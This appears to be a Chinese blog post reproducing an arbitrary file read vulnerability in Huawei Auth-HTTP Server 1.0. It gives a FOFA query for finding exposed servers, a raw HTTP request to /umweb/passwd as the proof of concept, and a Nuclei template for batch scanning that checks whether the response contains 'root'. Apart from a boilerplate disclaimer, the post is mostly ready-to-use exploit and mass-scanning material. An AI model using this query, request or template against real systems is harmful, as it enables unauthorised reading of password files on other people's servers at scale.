# 原创
：  漏洞复现--Huawei-Auth-HTTP-任意文件读取

# 漏洞复现--Huawei-Auth-HTTP-任意文件读取

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：漏洞描述

Huawei Auth-HTTP Server 1.0 是华为公司提供的一种身份验证及授权解决方案。它是一个基于HTTP协议的身份认证服务器，旨在为企业网络和系统提供安全的访问控制服务。该产品存在任意文件读取漏洞。

### 二：漏洞影响版本

未知

### 三：网络空间测绘查询

fofa:<br/> `server="Huawei Auth-Http Server 1.0" || icon_hash="-1812255781"`

### 四：漏洞复现

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ef8d9712cc88374f79cf76de8d222e56.jpeg"/><br/> POC:

```
GET /umweb/passwd HTTP/1.1
Host: x.x.x.x
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

```

### 五：批量检测

```
id: Huawei-Auth-HTTP-file-reads

info:
  name: Huawei-Auth-HTTP-file-reads
  author: 芝士土拨鼠
  severity: high
  description: description

requests:
  - raw:
      - |+
        GET /umweb/passwd HTTP/1.1
        Host: {{Hostname}}
        Cache-Control: max-age=0
        Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close


    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - root
      - type: status
        status:
          - 200

```
